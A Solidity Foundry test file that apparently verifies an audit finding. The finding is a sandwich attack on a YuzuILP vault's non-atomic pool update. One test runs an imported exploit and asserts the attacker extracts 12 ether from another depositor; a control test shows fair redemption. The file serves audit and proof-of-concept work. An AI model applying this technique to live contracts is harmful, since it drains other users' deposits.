// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, MockToken, YuzuILP, Manager, Victim} from
    "./62757-h-02-non-atomic-updatepool-enables-sandwich-attacks-and-extr.sol";

contract Finding62757Test is Test {
    function test_exploit_user1_extracts_12_from_user2() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.token().balanceOf(address(e)), 102 ether, "user1 deposited 90 and received 102");
        assertEq(e.token().balanceOf(address(e.ilp())), 78 ether, "78 left against user2's 90");
        assertEq(e.ilp().shares(address(e.victim())), 90 ether, "user2 shares unchanged");
        assertEq(e.ilp().dailyLinearYieldRatePpm(), 100000, "manager's yield write landed");
        assertEq(e.ilp().inflated(), 12 ether, "back-run paid 12 above shares burned");
    }

    function test_control_without_overwrite_user1_receives_principal() public {
        MockToken token = new MockToken();
        Victim victim = new Victim();
        Manager manager = new Manager();
        YuzuILP ilp = new YuzuILP(token, address(manager));
        token.mint(address(this), 90 ether);
        token.mint(address(victim), 90 ether);
        token.approve(address(ilp), type(uint256).max);
        victim.approve(token, address(ilp));
        ilp.deposit(90 ether);
        victim.deposit(ilp, 90 ether);

        ilp.redeem(30 ether);
        ilp.redeem(60 ether);

        assertEq(token.balanceOf(address(this)), 90 ether, "fair redeems return the 90 principal");
        assertEq(token.balanceOf(address(ilp)), 90 ether, "user2 is fully backed");
    }
}
